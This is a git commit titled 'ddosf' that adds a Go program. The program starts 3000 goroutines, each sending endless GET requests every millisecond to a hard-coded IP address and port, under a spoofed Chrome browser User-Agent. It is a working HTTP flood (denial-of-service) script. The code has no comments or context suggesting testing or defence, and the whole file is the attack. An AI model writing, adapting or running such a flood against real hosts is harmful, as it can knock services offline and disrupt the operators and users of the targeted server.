ba8069bfa299e38e4920d4618f742680632ad851
joobin <ss>
2024-01-13 16:47:03 +0330

    ddosf

---
+++ us/front/ddosf.go
@@ -0,0 +1,56 @@
+package main
+
+import (
+	"fmt"
+	"net/http"
+	"time"
+)
+
+func main() {
+	// Create a new integer channel
+	intChan := make(chan int)
+
+	Send2(0)
+	for i := 0; i < 3000; i++ {
+		fmt.Printf("i: %v\n", i)
+
+		go func() {
+			for {
+
+				Send2(0)
+
+				time.Sleep(1*time.Millisecond)
+
+			}
+		}()
+	}
+	fmt.Printf("\"ppp\": %v\n", "ppp")
+
+	<-intChan
+
+}
+
+func Send2(ij int) {
+
+	client := &http.Client{}
+	req, err := http.NewRequest("GET", "http://156.253.5.224:4173/", nil)
+	if err != nil {
+		fmt.Printf("err: %v\n", err)
+
+	}
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+ 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+
+	resp, _ := client.Do(req)
+	if resp!=nil {
+
+		
+		fmt.Printf("resp.Status: %v\n", resp.Status)
+	}else {
+		fmt.Printf("resp: %v\n", resp)
+	}
+
+
+	_ = resp
+
+}
